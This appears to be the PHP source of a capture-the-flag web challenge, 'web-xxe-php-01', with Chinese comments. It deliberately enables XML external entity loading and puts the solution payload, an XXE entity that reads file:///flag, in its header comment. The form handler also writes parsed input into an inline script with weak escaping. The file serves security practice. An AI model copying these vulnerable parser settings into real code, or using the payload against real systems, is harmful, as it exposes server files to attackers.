<?php
// web-xxe-php-01 | XXE XML 外部实体注入
// 解法: POST Content-Type: application/xml
// Body: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag">]><user><n>&xxe;</n></user>

error_reporting(0);
$flag_val = getenv('FLAG');
if ($flag_val && $flag_val !== 'FLAG_PLACEHOLDER') {
    file_put_contents('/flag', $flag_val);
}

libxml_disable_entity_loader(false);

$output = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $xmlfile = file_get_contents('php://input');
    if ($xmlfile) {
        // 漏洞点：启用外部实体加载，直接解析用户 XML
        $dom = new DOMDocument();
        $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
        $obj = simplexml_import_dom($dom);
        $output = "Hello, " . htmlspecialchars((string)$obj->n);
    }
}
?>
<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8">
<title>XML 数据接口</title>
<style>
  body{font-family:"Microsoft YaHei",monospace;background:#1e1e2e;color:#cdd6f4;
       display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
  .card{background:#313244;padding:40px;border-radius:8px;width:560px}
  h2{color:#89b4fa;text-align:center;margin:0 0 20px}
  .endpoint{background:#1e1e2e;padding:16px;border-radius:6px;
            border-left:4px solid #89b4fa;margin-bottom:20px}
  .endpoint p{margin:4px 0;font-size:14px;color:#a6e3a1}
  pre{background:#1e1e2e;padding:16px;border-radius:6px;overflow-x:auto;font-size:13px;color:#f38ba8}
  textarea{width:100%;background:#1e1e2e;color:#cdd6f4;border:1px solid #45475a;
           border-radius:6px;padding:12px;font-size:13px;font-family:monospace;
           box-sizing:border-box;resize:vertical;height:140px}
  button{width:100%;padding:10px;background:#89b4fa;color:#1e1e2e;border:none;
         border-radius:4px;cursor:pointer;font-size:15px;font-weight:bold;margin-top:10px}
  .result{margin-top:16px;padding:14px;background:#1e1e2e;border-radius:6px;
          border-left:4px solid #a6e3a1;font-size:14px}
</style>
</head>
<body>
<div class="card">
  <h2>📡 XML 数据接口</h2>
  <div class="endpoint">
    <p>POST /index.php</p>
    <p>Content-Type: application/xml</p>
    <p>Body: &lt;user&gt;&lt;n&gt;YourName&lt;/n&gt;&lt;/user&gt;</p>
  </div>
  <form method="POST">
    <textarea name="xml_data" placeholder="在此输入 XML..."><?php
      echo isset($_POST['xml_data']) ? htmlspecialchars($_POST['xml_data']) : "<user>\n  <n>Guest</n>\n</user>";
    ?></textarea>
    <button type="submit" onclick="document.querySelector('input[name=raw]').value=this.form.xml_data.value">发 送</button>
    <input type="hidden" name="raw" value="">
  </form>
  <?php if ($output): ?>
    <div class="result">响应：<?= $output ?></div>
  <?php endif; ?>
</div>
<?php
// 处理表单提交的 XML（从 textarea 传过来）
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['xml_data'])) {
    $xmlfile = $_POST['xml_data'];
    $dom = new DOMDocument();
    @$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
    $obj = @simplexml_import_dom($dom);
    if ($obj) echo "<script>document.querySelector('.result').innerText='响应：" . addslashes((string)$obj->n) . "'</script>";
}
?>
</body>
</html>
